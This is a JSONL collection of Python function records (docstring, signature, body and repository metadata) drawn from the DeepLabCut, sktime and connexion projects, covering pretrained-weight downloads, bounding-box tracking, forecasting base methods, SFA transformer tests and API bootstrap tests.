{"docstring": "\"\"\" Downloads weights pretrained on human data from DeeperCut. \"\"\"\n", "func_signal": "def download_mpii_weights(wd):\n", "code": "import urllib.request\nfrom pathlib import Path\n\nurl = [\n    \"https://datasets.d2.mpi-inf.mpg.de/deepercut-models-tensorflow/mpii-single-resnet-101.data-00000-of-00001\",\n    \"https://datasets.d2.mpi-inf.mpg.de/deepercut-models-tensorflow/mpii-single-resnet-101.meta\",\n    \"https://datasets.d2.mpi-inf.mpg.de/deepercut-models-tensorflow/mpii-single-resnet-101.index\",\n]\nfor i in url:\n    file = str(Path(i).name)\n    filename = file.replace(\"mpii-single-resnet-101\", \"snapshot-103000\")\n    filename = os.path.join(wd, filename)\n    if os.path.isfile(filename):\n        print(\"Weights already present!\")\n        break  # not checking all the 3 files.\n    else:\n        urllib.request.urlretrieve(i, filename)\n\nreturn filename", "path": "DeepLabCut/deeplabcut/utils/auxfun_models.py", "commit_date": "2020-05-30 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "\"\"\"\nTakes a bounding box in the centre form [x,y,s,r] and returns it in the form\n  [x1,y1,x2,y2] where x1,y1 is the top left and x2,y2 is the bottom right\n\"\"\"\n", "func_signal": "def convert_x_to_bbox(x, score=None):\n", "code": "w = np.sqrt(x[2] * x[3])\nh = x[2] / w\nif score == None:\n    return np.array(\n        [x[0] - w / 2.0, x[1] - h / 2.0, x[0] + w / 2.0, x[1] + h / 2.0]\n    ).reshape((1, 4))\nelse:\n    return np.array(\n        [x[0] - w / 2.0, x[1] - h / 2.0, x[0] + w / 2.0, x[1] + h / 2.0, score]\n    ).reshape((1, 5))", "path": "DeepLabCut/deeplabcut/pose_estimation_tensorflow/lib/trackingutils.py", "commit_date": "2020-05-30 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "# Modified from scipy source code:\n# - to restrict its use to 2D\n# - to get rid of shuffling (since arrays are only (nbodyparts * 3) element long)\n# TODO - factor in keypoint confidence (and weight by # of observations??)\n", "func_signal": "def weighted_hausdorff(x, y):\n", "code": "cmax = 0\nfor i in range(x.shape[0]):\n    no_break_occurred = True\n    cmin = np.inf\n    for j in range(y.shape[0]):\n        d = (x[i, 0] - y[j, 0]) ** 2 + (x[i, 1] - y[j, 1]) ** 2\n        if d < cmax:\n            no_break_occurred = False\n            break\n        if d < cmin:\n            cmin = d\n    if cmin != np.inf and cmin > cmax and no_break_occurred:\n        cmax = cmin\nreturn np.sqrt(cmax)", "path": "DeepLabCut/deeplabcut/pose_estimation_tensorflow/lib/trackingutils.py", "commit_date": "2020-05-30 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "\"\"\"\nTakes a bounding box in the form [x1,y1,x2,y2] and returns z in the form\n  [x,y,s,r] where x,y is the centre of the box and s is the scale/area and r is\n  the aspect ratio\n\"\"\"\n", "func_signal": "def convert_bbox_to_z(bbox):\n", "code": "w = bbox[2] - bbox[0]\nh = bbox[3] - bbox[1]\nx = bbox[0] + w / 2.0\ny = bbox[1] + h / 2.0\ns = w * h  # scale is just area\nr = w / float(h)\nreturn np.array([x, y, s, r]).reshape((4, 1))", "path": "DeepLabCut/deeplabcut/pose_estimation_tensorflow/lib/trackingutils.py", "commit_date": "2020-05-30 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "\"\"\" gets local path to network weights and checks if they are present. If not, downloads them from tensorflow.org \"\"\"\n", "func_signal": "def Check4weights(modeltype, parent_path, num_shuffles):\n", "code": "if \"resnet_50\" == modeltype:\n    model_path = (\n        parent_path\n        / \"pose_estimation_tensorflow/models/pretrained/resnet_v1_50.ckpt\"\n    )\nelif \"resnet_101\" == modeltype:\n    model_path = (\n        parent_path\n        / \"pose_estimation_tensorflow/models/pretrained/resnet_v1_101.ckpt\"\n    )\nelif \"resnet_152\" == modeltype:\n    model_path = (\n        parent_path\n        / \"pose_estimation_tensorflow/models/pretrained/resnet_v1_152.ckpt\"\n    )\nelif \"mobilenet\" in modeltype:\n    model_path = Path(\n        os.path.join(\n            parent_path,\n            \"pose_estimation_tensorflow/models/pretrained/\"\n            + str(modeltype)\n            + \"_224.ckpt\",\n        )\n    )\nelse:\n    print(\n        \"Currently ResNet (50, 101, 152) and MobilenetV2 (1, 0.75, 0.5 and 0.35) are supported, please change 'resnet' entry in config.yaml!\"\n    )\n    num_shuffles = -1  # thus the loop below is empty...\n    model_path = parent_path\n\nif num_shuffles > 0:\n    if not model_path.is_file():\n        Downloadweights(modeltype, model_path)\n\nreturn str(model_path), num_shuffles", "path": "DeepLabCut/deeplabcut/utils/auxfun_models.py", "commit_date": "2020-05-30 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "\"\"\"\nParams:\n  dets - a numpy array of detections in the format [[x1,y1,x2,y2,score],[x1,y1,x2,y2,score],...]\nRequires: this method must be called once for each frame even with empty detections.\nReturns the a similar array, where the last column is the object ID.\n\nNOTE: The number of objects returned may differ from the number of detections provided.\n\"\"\"\n", "func_signal": "def update(self, dets):\n", "code": "self.frame_count += 1\n# get predicted locations from existing trackers.\ntrks = np.zeros((len(self.trackers), 5))\n\nto_del = []\nret = []\nfor t, trk in enumerate(trks):\n    pos = self.trackers[t].predict()[0]\n    trk[:] = [pos[0], pos[1], pos[2], pos[3], 0]\n    if np.any(np.isnan(pos)):\n        to_del.append(t)\n\ntrks = np.ma.compress_rows(np.ma.masked_invalid(trks))\nfor t in reversed(to_del):\n    self.trackers.pop(t)\nmatched, unmatched_dets, unmatched_trks = associate_detections_to_trackers(\n    dets, trks, self.iou_threshold\n)\n\n# update matched trackers with assigned detections\nanimalindex = []\nfor t, trk in enumerate(self.trackers):\n    if t not in unmatched_trks:\n        d = matched[np.where(matched[:, 1] == t)[0], 0]\n        animalindex.append(d[0])\n        trk.update(dets[d, :][0])  # update coordinates\n    else:\n        animalindex.append(\"nix\")  # lost trk!\n\n# create and initialise new trackers for unmatched detections\nfor i in unmatched_dets:\n    trk = KalmanBoxTracker(dets[i, :])\n    self.trackers.append(trk)\n    animalindex.append(i)\n\ni = len(self.trackers)\nfor trk in reversed(self.trackers):\n    d = trk.get_state()[0]\n    if (trk.time_since_update < 1) and (\n        trk.hit_streak >= self.min_hits or self.frame_count <= self.min_hits\n    ):\n        ret.append(\n            np.concatenate((d, [trk.id, int(animalindex[i - 1])])).reshape(\n                1, -1\n            )\n        )  # for DLC we also return the original animalid\n        # +1 as MOT benchmark requires positive >> this is removed for DLC!\n    i -= 1\n    # remove dead tracklet\n    if trk.time_since_update > self.max_age:\n        self.trackers.pop(i)\n\nif len(ret) > 0:\n    return np.concatenate(ret)\nreturn np.empty((0, 5))", "path": "DeepLabCut/deeplabcut/pose_estimation_tensorflow/lib/trackingutils.py", "commit_date": "2020-05-30 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "# load training data\n", "func_signal": "def test_sfa_anova():\n", "code": "X, y = load_gunpoint(split=\"train\", return_X_y=True)\n\nword_length = 6\nalphabet_size = 4\n\nfor binning in [\"information-gain\", \"equi-depth\"]:\n    # print(\"SFA with ANOVA one-sided test\")\n    window_size = 32\n    p = SFA(\n        word_length=word_length,\n        anova=True,\n        alphabet_size=alphabet_size,\n        window_size=window_size,\n        binning_method=binning,\n    ).fit(X, y)\n\n    # print(p.breakpoints)\n    # print(p.support)\n    # print(p.dft_length)\n\n    assert p.breakpoints.shape == (word_length, alphabet_size)\n    _ = p.transform(X, y)\n\n    # print(\"SFA with first feq coefficients\")\n    p2 = SFA(\n        word_length=word_length,\n        anova=False,\n        alphabet_size=alphabet_size,\n        window_size=window_size,\n        binning_method=binning,\n    ).fit(X, y)\n\n    # print(p2.breakpoints)\n    # print(p2.support)\n    # print(p2.dft_length)\n\n    assert p.dft_length != p2.dft_length\n    assert (p.breakpoints != p2.breakpoints).any()\n    _ = p2.transform(X, y)", "path": "sktime/sktime/transformations/panel/dictionary_based/tests/test_sfa.py", "commit_date": "2020-12-19 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "\"\"\"Make forecasts\n\nParameters\n----------\nfh : int, list or np.array\n    Forecasting horizon\nX : pd.DataFrame, optional (default=None)\n    Exogenous time series\nreturn_pred_int : bool, optional (default=False)\n    If True, returns prediction intervals for given alpha values.\nalpha : float or list, optional (default=0.95)\n\nReturns\n-------\ny_pred : pd.Series\n    Point predictions\ny_pred_int : pd.DataFrame\n    Prediction intervals\n\"\"\"\n", "func_signal": "def predict(self, fh=None, X=None, return_pred_int=False, alpha=DEFAULT_ALPHA):\n", "code": "self.check_is_fitted()\nself._set_fh(fh)\nreturn self._predict(self.fh, X, return_pred_int=return_pred_int, alpha=alpha)", "path": "sktime/sktime/forecasting/base/_sktime.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "# load training data\n", "func_signal": "def test_word_lengths():\n", "code": "X, y = load_gunpoint(split=\"train\", return_X_y=True)\n\nword_lengths = [6, 7]\nalphabet_size = 4\nwindow_sizes = [5, 6]\n\ntry:\n    for binning in [\"equi-depth\", \"information-gain\"]:\n        for word_length in word_lengths:\n            for bigrams in [True, False]:\n                for norm in [True, False]:\n                    for anova in [True, False]:\n                        for window_size in window_sizes:\n                            p = SFA(\n                                word_length=word_length,\n                                anova=anova,\n                                alphabet_size=alphabet_size,\n                                bigrams=bigrams,\n                                window_size=window_size,\n                                norm=norm,\n                                binning_method=binning,\n                            ).fit(X, y)\n\n                            # print(\"Norm\", norm, \"Anova\", anova)\n                            # print(np.shape(p.breakpoints), word_length,\n                            #      window_size)\n                            # print(\"dft_length\", p.dft_length,\n                            #      \"word_length\", p.word_length)\n                            assert p.breakpoints is not None\n\n                            _ = p.transform(X, y)\n\nexcept Exception as err:\n    raise AssertionError(\"An unexpected exception {0} raised.\".format(repr(err)))", "path": "sktime/sktime/transformations/panel/dictionary_based/tests/test_sfa.py", "commit_date": "2020-12-19 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "\"\"\"Select last window\"\"\"\n# get the start and end points of the last window\n", "func_signal": "def _get_last_window(self):\n", "code": "cutoff = self.cutoff\nstart = _shift(cutoff, by=-self.window_length_ + 1)\n\n# get the last window of the endogenous variable\ny = self._y.loc[start:cutoff].to_numpy()\n\n# if exogenous variables are given, also get the last window of\n# those\nif self._X is not None:\n    X = self._X.loc[start:cutoff].to_numpy()\nelse:\n    X = None\nreturn y, X", "path": "sktime/sktime/forecasting/base/_sktime.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "\"\"\"Combining lower and upper bound of\nprediction intervals. Slicing on fh.\n\nParameters\n----------\nlower : pd.Series\n    Lower bound (can contain also in-sample bound)\nupper : pd.Series\n    Upper bound (can contain also in-sample bound)\n\nReturns\n-------\npd.DataFrame\n    pred_int, predicion intervalls (out-sample, sliced by fh)\n\"\"\"\n", "func_signal": "def _get_pred_int(self, lower, upper):\n", "code": "pred_int = pd.DataFrame({\"lower\": lower, \"upper\": upper})\n# Out-sample fh\nfh_out = self.fh.to_out_of_sample(cutoff=self.cutoff)\n# If pred_int contains in-sample prediction intervals\nif len(pred_int) > len(self._y):\n    len_out = len(pred_int) - len(self._y)\n    # Workaround for slicing with negative index\n    pred_int[\"idx\"] = [x for x in range(-len(self._y), len_out)]\n# If pred_int does not contain in-sample prediction intervals\nelse:\n    pred_int[\"idx\"] = [x for x in range(len(pred_int))]\npred_int = pred_int.loc[\n    pred_int[\"idx\"].isin(fh_out.to_indexer(self.cutoff).values)\n]\npred_int.index = fh_out.to_absolute(self.cutoff)\npred_int = pred_int.drop(columns=[\"idx\"])\nreturn pred_int", "path": "sktime/sktime/forecasting/base/_sktime.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "\"\"\"The forecasting horizon\"\"\"\n# raise error if some method tries to accessed it before it has been\n# set\n", "func_signal": "def fh(self):\n", "code": "if self._fh is None:\n    raise ValueError(\n        \"No `fh` has been set yet, please specify `fh` \" \"in `fit` or `predict`\"\n    )\nreturn self._fh", "path": "sktime/sktime/forecasting/base/_sktime.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "# training data\n", "func_signal": "def __init__(self):\n", "code": "self._y = None\nself._X = None\n\n# forecasting horizon\nself._fh = None\nself._cutoff = None  # reference point for relative fh\nsuper(_SktimeForecaster, self).__init__()", "path": "sktime/sktime/forecasting/base/_sktime.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "# load training data\n", "func_signal": "def test_transformer():\n", "code": "X, y = load_gunpoint(split=\"train\", return_X_y=True)\n\nword_length = 6\nalphabet_size = 4\n\np = SFA(\n    word_length=word_length,\n    alphabet_size=alphabet_size,\n    anova=False,\n    binning_method=\"equi-depth\",\n).fit(X, y)\n\n# print(\"Equi Depth\")\n# print(p.breakpoints)\n\nassert p.breakpoints.shape == (word_length, alphabet_size)\nassert np.equal(0, p.breakpoints[1, :-1]).all()  # imag component is 0\n_ = p.transform(X, y)\n\np = SFA(\n    word_length=word_length,\n    alphabet_size=alphabet_size,\n    anova=False,\n    binning_method=\"equi-width\",\n).fit(X, y)\n\n# print(\"Equi Width\")\n# print(p.breakpoints)\n\nassert p.breakpoints.shape == (word_length, alphabet_size)\nassert np.equal(0, p.breakpoints[1, :-1]).all()  # imag component is 0\n_ = p.transform(X, y)\n\np = SFA(\n    word_length=word_length,\n    alphabet_size=alphabet_size,\n    anova=False,\n    binning_method=\"information-gain\",\n).fit(X, y)\n# print(\"Information Gain\")\n# print(p.breakpoints)\n\nassert p.breakpoints.shape == (word_length, alphabet_size)\n\n# print(p.breakpoints[1, :-1])\nassert np.equal(sys.float_info.max, p.breakpoints[1, :-1]).all()\n_ = p.transform(X, y)", "path": "sktime/sktime/transformations/panel/dictionary_based/tests/test_sfa.py", "commit_date": "2020-12-19 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "\"\"\"\nGet the prediction intervals for a forecast. Must be run *after* the\nforecaster has been fitted.\n\nIf alpha is iterable, multiple intervals will be calculated.\n\nParameters\n----------\n\ny_pred : pd.Series\n    Point predictions.\n\nalpha : float or list, optional (default=0.95)\n    A significance level or list of significance levels.\n\nReturns\n-------\n\nintervals : pd.DataFrame\n    A table of upper and lower bounds for each point prediction in\n    ``y_pred``. If ``alpha`` was iterable, then ``intervals`` will be a\n    list of such tables.\n\"\"\"\n\n", "func_signal": "def compute_pred_int(self, y_pred, alpha=DEFAULT_ALPHA):\n", "code": "alphas = check_alpha(alpha)\nerrors = self._compute_pred_err(alphas)\n\n# compute prediction intervals\npred_int = [\n    pd.DataFrame({\"lower\": y_pred - error, \"upper\": y_pred + error})\n    for error in errors\n]\n\n# for a single alpha, return single pd.DataFrame\nif isinstance(alpha, float):\n    return pred_int[0]\n\n# otherwise return list of pd.DataFrames\nreturn pred_int", "path": "sktime/sktime/forecasting/base/_sktime.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "\"\"\"Save fitted strategy\"\"\"\n", "func_signal": "def save_fitted_strategy(self, strategy, dataset_name, cv_fold):\n", "code": "path = self._generate_key(strategy.name, dataset_name, cv_fold,\n                          train_or_test=\"train\") + \".pickle\"\nstrategy.save(path)\nself._append_key(strategy.name, dataset_name)", "path": "sktime/sktime/benchmarking/results.py", "commit_date": "2020-06-04 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "# load training data\n", "func_signal": "def test_dft_mft():\n", "code": "X, Y = load_gunpoint(split=\"train\", return_X_y=True)\nX_tab = from_nested_to_2d_array(X, return_numpy=True)\n\nword_length = 6\nalphabet_size = 4\n\n# print(\"Single DFT transformation\")\nwindow_size = np.shape(X_tab)[1]\np = SFA(\n    word_length=word_length,\n    alphabet_size=alphabet_size,\n    window_size=window_size,\n    binning_method=\"equi-depth\",\n).fit(X, Y)\ndft = p._discrete_fourier_transform(X_tab[0])\nmft = p._mft(X_tab[0])\n\nassert (mft - dft < 0.0001).all()\n\n# print(\"Windowed DFT transformation\")\n\nfor norm in [True, False]:\n    for window_size in [140]:\n        p = SFA(\n            word_length=word_length,\n            norm=norm,\n            alphabet_size=alphabet_size,\n            window_size=window_size,\n            binning_method=\"equi-depth\",\n        ).fit(X, Y)\n        mft = p._mft(X_tab[0])\n        for i in range(len(X_tab[0]) - window_size + 1):\n            dft_transformed = p._discrete_fourier_transform(\n                X_tab[0, i : window_size + i]\n            )\n            assert (mft[i] - dft_transformed < 0.001).all()\n\n        assert len(mft) == len(X_tab[0]) - window_size + 1\n        assert len(mft[0]) == word_length", "path": "sktime/sktime/transformations/panel/dictionary_based/tests/test_sfa.py", "commit_date": "2020-12-19 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "\"\"\"Set training data.\n\nParameters\n----------\ny : pd.Series\n    Endogenous time series\nX : pd.DataFrame, optional (default=None)\n    Exogenous time series\n\"\"\"\n# set initial training data\n", "func_signal": "def _set_y_X(self, y, X=None, enforce_index_type=None):\n", "code": "self._y, self._X = check_y_X(\n    y, X, allow_empty=False, enforce_index_type=enforce_index_type\n)\n\n# set initial cutoff to the end of the training data\nself._set_cutoff(y.index[-1])", "path": "sktime/sktime/forecasting/base/_sktime.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "\"\"\"Loads predictions for all datasets and strategies iteratively\"\"\"\n", "func_signal": "def load_predictions(self, cv_fold, train_or_test):\n", "code": "for strategy_name, dataset_name in self._iter():\n    key = self._generate_key(strategy_name, dataset_name, cv_fold,\n                             train_or_test)\n    yield self.results[key]", "path": "sktime/sktime/benchmarking/results.py", "commit_date": "2020-06-04 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "\"\"\"Check, set and update the forecasting horizon.\n\nParameters\n----------\nfh : None, int, list or np.ndarray\n\"\"\"\n", "func_signal": "def _set_fh(self, fh):\n", "code": "if fh is None:\n    if self.is_fitted:\n        # if no fh passed and there is none already, raise error\n        if self._fh is None:\n            raise ValueError(\n                \"The forecasting horizon `fh` must be passed \"\n                \"either to `fit` or `predict`, \"\n                \"but was found in neither.\"\n            )\n        # otherwise if no fh passed, but there is one already,\n        # we can simply use that one\nelse:\n    # If fh is passed, validate first, then check if there is one\n    # already,\n    # and overwrite\n\n    # A warning should only be raised if fh passed to fit is\n    # overwritten, but no warning is required when no fh has been provided in\n    # fit, and different fhs are passed to predict, but this requires\n    # to keep track of whether fh has been passed to fit or not, hence not\n    # implemented for cutoff.\n    fh = check_fh(fh)\n    self._fh = fh", "path": "sktime/sktime/forecasting/base/_sktime.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "\"\"\"Load saved (fitted) strategy\"\"\"\n", "func_signal": "def load_fitted_strategy(self, strategy_name, dataset_name, cv_fold):\n", "code": "for strategy_name, dataset_name in self._iter():\n    key = self._generate_key(strategy_name, dataset_name, cv_fold,\n                             train_or_test=\"train\") + \".pickle\"\n    # TODO if we use strategy specific saving function, how do we\n    #  remember how to load them? check file endings?\n    return load(key)", "path": "sktime/sktime/benchmarking/results.py", "commit_date": "2020-06-04 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "\"\"\"Format moving-cutoff predictions\"\"\"\n", "func_signal": "def _format_moving_cutoff_predictions(y_preds, cutoffs):\n", "code": "if not isinstance(y_preds, list):\n    raise ValueError(f\"`y_preds` must be a list, but found: {type(y_preds)}\")\n\nif len(y_preds[0]) == 1:\n    # return series for single step ahead predictions\n    return pd.concat(y_preds)\n\nelse:\n    # return data frame when we predict multiple steps ahead\n    y_pred = pd.DataFrame(y_preds).T\n    y_pred.columns = cutoffs\n    if y_pred.shape[1] == 1:\n        return y_pred.iloc[:, 0]\n    return y_pred", "path": "sktime/sktime/forecasting/base/_sktime.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "\"\"\"Combining in-sample and out-sample prediction\nand slicing on given fh.\n\nParameters\n----------\ny_in_sample : pd.Series\n    In-sample prediction\ny_out_sample : pd.Series\n    Out-sample prediction\n\nReturns\n-------\npd.Series\n    y_pred, sliced by fh\n\"\"\"\n", "func_signal": "def _get_y_pred(self, y_in_sample, y_out_sample):\n", "code": "y_pred = y_in_sample.append(y_out_sample, ignore_index=True).rename(\"y_pred\")\ny_pred = pd.DataFrame(y_pred)\n# Workaround for slicing with negative index\ny_pred[\"idx\"] = [x for x in range(-len(y_in_sample), len(y_out_sample))]\ny_pred = y_pred.loc[y_pred[\"idx\"].isin(self.fh.to_indexer(self.cutoff).values)]\ny_pred.index = self.fh.to_absolute(self.cutoff)\ny_pred = y_pred[\"y_pred\"].rename(None)\nreturn y_pred", "path": "sktime/sktime/forecasting/base/_sktime.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "\"\"\"When in detached cutoff mode, the cutoff can be updated but will\nbe reset to the initial value after leaving the detached cutoff mode.\n\nThis is useful during rolling-cutoff forecasts when the cutoff needs\nto be repeatedly reset, but afterwards should be restored to the\noriginal value.\n\"\"\"\n", "func_signal": "def _detached_cutoff(self):\n", "code": "cutoff = self.cutoff  # keep initial cutoff\ntry:\n    yield\nfinally:\n    # re-set cutoff to initial value\n    self._set_cutoff(cutoff)", "path": "sktime/sktime/forecasting/base/_sktime.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "\"\"\"Update fitted parameters\n\nParameters\n----------\ny : pd.Series\nX : pd.DataFrame\nupdate_params : bool, optional (default=False)\n\nReturns\n-------\nself : an instance of self\n\"\"\"\n", "func_signal": "def update(self, y, X=None, update_params=False):\n", "code": "if update_params:\n    raise NotImplementedError(\n        f\"{self.__class__.__name__} does not \"\n        f\"yet support updating fitted \"\n        f\"parameters.\"\n    )\nself.check_is_fitted()\nself._update_y_X(y, X)\nreturn self", "path": "sktime/sktime/forecasting/base/_sktime.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "\"\"\"Load saved predictions\"\"\"\n\n", "func_signal": "def load_predictions(self, cv_fold, train_or_test):\n", "code": "for strategy_name, dataset_name in self._iter():\n    key = self._generate_key(strategy_name, dataset_name, cv_fold,\n                             train_or_test=train_or_test) + \".csv\"\n    results = pd.read_csv(key, header=0)\n    index = results.loc[:, \"index\"].values\n    y_true = results.loc[:, \"y_true\"].values\n    y_pred = results.loc[:, \"y_pred\"].values\n    yield _PredictionsWrapper(strategy_name, dataset_name, index,\n                              y_true, y_pred)", "path": "sktime/sktime/benchmarking/results.py", "commit_date": "2020-06-04 00:00:00", "repo_name": "sktime/sktime", "stars": 7255, "license": "bsd-3-clause", "language": "python", "size": 67138}
{"docstring": "# Unresolvable operationIDs should result in a well-defined error that can\n# be handled upstream.\n", "func_signal": "def test_bad_operation_id():\n", "code": "with pytest.raises(ResolverError):\n    Resolver().resolve_function_from_operation_id('ohai.I.do.not.exist')\nwith pytest.raises(ResolverError):\n    RestyResolver('connexion').resolve_function_from_operation_id('ohai.I.do.not.exist')", "path": "connexion/tests/test_resolver.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "# Missing operationIDs should result in a well-defined error that can\n# be handled upstream.\n", "func_signal": "def test_missing_operation_id():\n", "code": "with pytest.raises(ResolverError):\n    Resolver().resolve_function_from_operation_id(None)\nwith pytest.raises(ResolverError):\n    RestyResolver('connexion').resolve_function_from_operation_id(None)", "path": "connexion/tests/test_resolver.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "\"\"\" Verify the spec json file is returned for default setting passed to app. \"\"\"\n", "func_signal": "def test_swagger_json_app(simple_api_spec_dir, spec):\n", "code": "app = App(__name__, port=5001, specification_dir=simple_api_spec_dir, debug=True)\napp.add_api(spec)\napp_client = app.app.test_client()\nurl = '/v1.0/{spec}'\nurl = url.format(spec=spec.replace(\"yaml\", \"json\"))\nspec_json = app_client.get(url)  # type: flask.Response\nassert spec_json.status_code == 200", "path": "connexion/tests/api/test_bootstrap.py", "commit_date": "2020-04-23 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "\"\"\"\nLoads a YAML specification file, optionally rendering it with Jinja2.\nTakes:\n  arguments - passed to Jinja2 renderer\n  specification - path to specification\n\"\"\"\n", "func_signal": "def _load_spec_from_file(arguments, specification):\n", "code": "arguments = arguments or {}\n\nwith specification.open(mode='rb') as openapi_yaml:\n    contents = openapi_yaml.read()\n    try:\n        openapi_template = contents.decode()\n    except UnicodeDecodeError:\n        openapi_template = contents.decode('utf-8', 'replace')\n\n    openapi_string = jinja2.Template(openapi_template).render(**arguments)\n    return yaml.safe_load(openapi_string)", "path": "connexion/connexion/spec.py", "commit_date": "2019-12-17 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "\"\"\" Verify the swagger-ui-config.json file is returned for swagger_ui_config option passed to app. \"\"\"\n", "func_signal": "def test_swagger_ui_config_json(simple_api_spec_dir, spec):\n", "code": "swagger_ui_config = {\"displayOperationId\": True}\noptions = {\"swagger_ui_config\": swagger_ui_config}\napp = App(__name__, port=5001, specification_dir=simple_api_spec_dir,\n          options=options, debug=True)\napp.add_api(spec)\napp_client = app.app.test_client()\nurl = '/v1.0/ui/swagger-ui-config.json'\nswagger_ui_config_json = app_client.get(url)  # type: flask.Response\nassert swagger_ui_config_json.status_code == 200\nassert swagger_ui_config == json.loads(swagger_ui_config_json.get_data(as_text=True))", "path": "connexion/tests/api/test_bootstrap.py", "commit_date": "2020-04-23 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "\"\"\" Verify the spec json file is not returned when set to False when adding api. \"\"\"\n", "func_signal": "def test_no_swagger_json_api(simple_api_spec_dir, spec):\n", "code": "app = App(__name__, port=5001, specification_dir=simple_api_spec_dir, debug=True)\napp.add_api(spec, options={\"serve_spec\": False})\n\napp_client = app.app.test_client()\nurl = '/v1.0/{spec}'.format(spec=spec.replace(\"yaml\", \"json\"))\nswagger_json = app_client.get(url)  # type: flask.Response\nassert swagger_json.status_code == 404", "path": "connexion/tests/api/test_bootstrap.py", "commit_date": "2020-04-23 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "\"\"\"\nTakes in a dictionary, and returns a Specification\n\"\"\"\n", "func_signal": "def from_dict(cls, spec):\n", "code": "def enforce_string_keys(obj):\n    # YAML supports integer keys, but JSON does not\n    if isinstance(obj, dict):\n        return {\n            str(k): enforce_string_keys(v)\n            for k, v\n            in obj.items()\n        }\n    return obj\n\nspec = enforce_string_keys(spec)\nversion = cls._get_spec_version(spec)\nif version < (3, 0, 0):\n    return Swagger2Specification(spec)\nreturn OpenAPISpecification(spec)", "path": "connexion/connexion/spec.py", "commit_date": "2019-12-17 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "\"\"\" Verify the spec json file is not returned when set to False when creating app. \"\"\"\n", "func_signal": "def test_no_swagger_json_app(simple_api_spec_dir, spec):\n", "code": "options = {\"serve_spec\": False}\napp = App(__name__, port=5001, specification_dir=simple_api_spec_dir,\n          options=options, debug=True)\napp.add_api(spec)\n\napp_client = app.app.test_client()\nurl = '/v1.0/{spec}'\nurl = url.format(spec=spec.replace(\"yaml\", \"json\"))\nspec_json = app_client.get(url)  # type: flask.Response\nassert spec_json.status_code == 404", "path": "connexion/tests/api/test_bootstrap.py", "commit_date": "2020-04-23 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
